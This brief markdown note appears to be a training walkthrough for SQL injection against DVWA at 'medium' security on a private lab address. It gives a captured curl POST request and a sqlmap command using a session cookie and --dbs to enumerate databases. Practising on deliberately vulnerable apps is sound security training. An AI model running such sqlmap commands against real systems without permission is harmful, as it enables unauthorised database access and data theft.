# SQL Injection

## DVWA Security Medium.

### Server now uses POST method

Add --data to sqlmap

```bash
curl "http://192.168.0.15/dvwa/vulnerabilities/sqli/#" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8" -H "Accept-Language: cs,en-US;q=0.7,en;q=0.3" --compressed -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://192.168.0.15" -H "DNT: 1" -H "Connection: keep-alive" -H "Referer: http://192.168.0.15/dvwa/vulnerabilities/sqli/" -H "Cookie: security=medium; PHPSESSID=j35dq5nn3m7npp5hbqquspagg7" -H "Upgrade-Insecure-Requests: 1" --data-raw "id=1&Submit=Submit"
```

```bash
sqlmap -u "http://192.168.0.15/dvwa/vulnerabilities/sqli/#" --cookie="security=medium; PHPSESSID=797pl8e9p24kj4ajl47a62ljq1" --data 'id=1&Submit=Submit' --dbs
```
